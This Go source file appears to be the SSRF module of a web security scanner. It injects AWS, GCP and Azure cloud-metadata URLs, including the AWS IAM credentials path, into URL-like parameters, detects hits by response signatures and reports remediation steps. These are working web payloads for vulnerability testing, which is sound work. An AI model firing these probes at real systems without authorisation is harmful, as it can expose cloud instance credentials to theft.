// Package ssrf tests server-side request forgery: it injects internal and
// cloud-metadata URLs into parameters that look like URLs and confirms a hit
// when the server returns metadata-service content.
package ssrf

import (
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"strings"

	"github.com/sayseven7/frameseven/internal/config"
	"github.com/sayseven7/frameseven/internal/finding"
	"github.com/sayseven7/frameseven/internal/tools/v1/recon"
)

// probe is an injection URL paired with a regex that confirms a hit.
type probe struct {
	label     string
	payload   string
	signature *regexp.Regexp
}

var probes = []probe{
	{"AWS metadata", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", regexp.MustCompile(`(?i)instance-id|ami-id|security-credentials|AccessKeyId`)},
	{"GCP metadata", "http://metadata.google.internal/computeMetadata/v1/", regexp.MustCompile(`(?i)computeMetadata|/computeMetadata/v1/|project-id`)},
	{"Azure metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", regexp.MustCompile(`(?i)azEnvironment|"compute"|vmId`)},
}

var paramHint = regexp.MustCompile(`(?i)url|uri|link|src|dest|redirect|next|host|target|callback|img|image|load|fetch|domain|site|return|continue|feed|proxy`)

type response struct {
	body string
	dump string
}

// Run injects SSRF payloads into candidate parameters.
func Run(cfg *config.Config, client *http.Client, surface *recon.Surface) []finding.Finding {
	var findings []finding.Finding
	tested := map[string]bool{}
	matchedAny := false

	for _, p := range surface.Params {
		if !paramHint.MatchString(p.Name) {
			continue
		}

		u, err := url.Parse(p.Endpoint)
		if err != nil {
			continue
		}

		key := p.Name + "|" + u.Path
		if tested[key] {
			continue
		}

		tested[key] = true
		matchedAny = true

		findings = append(findings, testParam(cfg, client, p)...)
	}

	if !matchedAny {
		findings = append(findings, finding.Finding{
			Title:       "No URL-like parameters discovered for SSRF testing",
			Module:      "ssrf",
			Severity:    finding.Info,
			OWASP:       "A10:2025 - Server-Side Request Forgery",
			Description: "None of the discovered parameters matched the URL/redirect hint pattern. SSRF probes were skipped.",
			NextSteps:   []string{"Manually inspect the application for parameters that accept URLs or redirect targets."},
		})
	}

	return findings
}

func testParam(cfg *config.Config, client *http.Client, p recon.Param) []finding.Finding {
	var findings []finding.Finding

	for _, pr := range probes {
		resp := inject(cfg, client, p, pr.payload)
		if resp == nil || !pr.signature.MatchString(resp.body) {
			continue
		}

		findings = append(findings, finding.Finding{
			Title:       "SSRF via parameter '" + p.Name + "' (" + pr.label + ")",
			Module:      "ssrf",
			Severity:    finding.Critical,
			OWASP:       "A10:2025 - Server-Side Request Forgery",
			CWE:         "CWE-918",
			CVSS:        9.1,
			Description: "The server fetched an attacker-controlled internal URL; cloud metadata was reachable, exposing instance credentials.",
			Evidence: finding.Evidence{
				Request:   resp.dump,
				Response:  trim(resp.body, 500),
				Extracted: pr.label + " via " + pr.payload,
			},
			NextSteps: []string{
				"Allowlist outbound destinations and block link-local/internal ranges (169.254.0.0/16, 127.0.0.0/8).",
				"Disable unused URL schemes and require authentication on the metadata service (IMDSv2).",
			},
		})
	}

	return findings
}

func inject(cfg *config.Config, client *http.Client, p recon.Param, payload string) *response {
	u, err := url.Parse(p.Endpoint)
	if err != nil {
		return nil
	}

	q := u.Query()
	q.Set(p.Name, payload)
	u.RawQuery = q.Encode()

	req, err := http.NewRequest(http.MethodGet, u.String(), nil)
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", cfg.UserAgent)

	dump, _ := httputil.DumpRequestOut(req, false)

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))

	return &response{body: string(body), dump: string(dump)}
}

func trim(s string, max int) string {
	s = strings.TrimSpace(s)
	if len(s) > max {
		return s[:max]
	}

	return s
}
